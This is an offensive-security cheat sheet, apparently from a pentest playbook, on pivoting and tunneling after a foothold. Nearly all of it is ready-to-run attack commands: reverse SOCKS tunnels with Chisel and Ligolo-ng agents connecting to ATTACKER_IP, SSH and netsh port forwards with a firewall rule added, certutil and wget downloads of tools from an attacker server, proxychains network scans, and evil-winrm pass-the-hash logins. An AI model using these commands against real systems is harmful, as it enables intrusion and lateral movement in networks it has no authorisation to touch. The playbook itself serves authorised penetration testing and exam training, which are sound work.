---
id: pivot
title: Pivot / Tunneling
stage: objective
tags: [windows, linux]
tools:
  - "./chisel server --port 9090 --reverse"
  - "./chisel client ATTACKER_IP:9090 R:socks"
  - "./proxy -selfcert -laddr 0.0.0.0:11601"
  - ssh -D 1080 -N user@PIVOT_HOST
leads_to:
  - nmap-scan
  - smb-enum
  - ldap-enum
---

## Identify New Networks (run on every foothold)

```bash
# Linux
ip a && ip route && arp -a && cat /etc/hosts
ss -anp    # internal services

# Windows
ipconfig /all
route print
arp -a
netstat -ano
```

## Chisel (most reliable, works through firewalls)

```bash
# Attacker
./chisel server --port 9090 --reverse

# Pivot host — creates SOCKS5 at attacker:1080
./chisel client ATTACKER_IP:9090 R:socks

# Specific port forward
./chisel client ATTACKER_IP:9090 R:8080:10.10.10.5:80
```

Transfer to target:

```bash
# Linux
wget http://ATTACKER_IP:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Windows
certutil -urlcache -f http://ATTACKER_IP:8000/chisel.exe C:\Windows\Temp\chisel.exe
```

## Ligolo-ng (best for complex multi-hop networks)

```bash
# Attacker
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot host
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Ligolo console
session         # select session
ifconfig        # see pivot's interfaces
start           # start tunnel

# Add route on attacker (no proxychains needed)
sudo ip route add 10.10.10.0/24 dev ligolo
nmap -Pn -sV 10.10.10.5   # direct traffic
```

## SSH Tunneling

```bash
# Local port forward (pull remote service to localhost)
ssh -L 8080:10.10.10.5:80 user@PIVOT_HOST

# Dynamic SOCKS proxy (route all traffic through pivot)
ssh -D 1080 -N user@PIVOT_HOST

# Proxychains config (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080
```

## Netsh (Windows built-in — no tools needed)

```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.10.5 connectport=80
netsh interface portproxy show all

# Open firewall for listener
netsh advfirewall firewall add rule name="pivot" dir=in action=allow protocol=TCP localport=8080
```

## Proxychains Usage

```bash
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
# Must use -sT (TCP connect) with nmap — SYN scan doesn't work through proxychains
proxychains nmap -Pn -sT -p 22,80,443,139,445,3389,5985 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.5 -u Administrator -H HASH
proxychains nxc smb 10.10.10.0/24 -u user -p pass
```

## File Transfer

```bash
# Serve files (attacker)
python3 -m http.server 8000
impacket-smbserver share $(pwd) -smb2support   # Windows targets

# Windows download
certutil -urlcache -f http://ATTACKER_IP:8000/file.exe C:\Windows\Temp\file.exe
iwr http://ATTACKER_IP:8000/file.exe -o C:\Windows\Temp\file.exe
copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\

# Linux download
wget http://ATTACKER_IP:8000/file -O /tmp/file
```

## Notes

After pivoting, restart the recon/enum cycle on the new network. Ligolo-ng is cleaner for exam environments — no proxychains needed for most tools. Chisel is more portable and firewall-friendly.
